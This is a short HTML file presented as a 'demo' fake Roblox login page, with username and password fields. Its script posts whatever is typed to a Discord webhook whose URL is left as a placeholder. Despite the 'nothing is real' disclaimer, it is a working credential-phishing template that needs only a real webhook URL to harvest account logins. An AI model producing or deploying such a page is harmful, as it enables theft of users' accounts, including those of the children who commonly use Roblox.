<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Demo Login Page</title>
</head>
<body style="text-align:center; margin-top:100px; font-family:sans-serif;">
  <h2>Fake Roblox Login (Demo)</h2>
  <input id="username" placeholder="Username"><br><br>
  <input id="password" placeholder="Password"><br><br>
  <button onclick="sendData()">Login (Demo)</button>
  <p style="color:red;">⚠️ This is a demo only. Nothing is real.</p>

  <script>
    function sendData() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      fetch("YOUR_DISCORD_WEBHOOK_URL", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `Demo login: Username = ${username}, Password = ${password}`
        })
      });

      alert("Demo login data sent to Discord (no real data used).");
    }
  </script>
</body>
</html>
